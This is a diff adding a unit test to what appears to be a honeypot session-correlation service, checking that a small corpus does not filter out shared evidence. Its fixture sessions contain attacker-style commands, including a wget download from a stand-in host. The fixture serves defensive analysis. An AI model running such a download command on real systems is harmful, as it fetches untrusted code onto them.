@@ -2,6 +2,7 @@ from __future__ import annotations
 
 from datetime import datetime, timedelta, timezone
 
+from app.correlation.features import CorrelationContext, Session
 from app.correlation.scoring import ALGORITHM_VERSION
 
 
@@ -293,3 +294,27 @@ def test_feedback_is_recorded_and_marks_campaign(client, sensor_headers, admin_h
 def test_viewer_cannot_run_correlation(client, viewer_headers):
     response = client.post("/api/v1/correlate", json={}, headers=viewer_headers)
     assert response.status_code == 403
+
+
+def test_small_corpus_does_not_filter_shared_evidence():
+    """On a handful of sessions every token would look ubiquitous.
+
+    The corpus filter must stay out of the way until document frequency is a
+    meaningful estimate, otherwise identical sessions compare as empty.
+    """
+
+    sessions = [
+        Session(
+            id=f"sess-small-{index}",
+            source_ips={f"198.51.100.{index + 1}"},
+            usernames={"root"},
+            clients={"SSH-2.0-libssh_0.9.6"},
+            commands=["uname -a", "wget http://198.51.100.200/x"],
+        )
+        for index in range(6)
+    ]
+    context = CorrelationContext.from_sessions(sessions)
+
+    assert context.n_sessions == 6
+    assert context.is_informative("username", "root")
+    assert context.is_informative("client", "SSH-2.0-libssh_0.9.6")
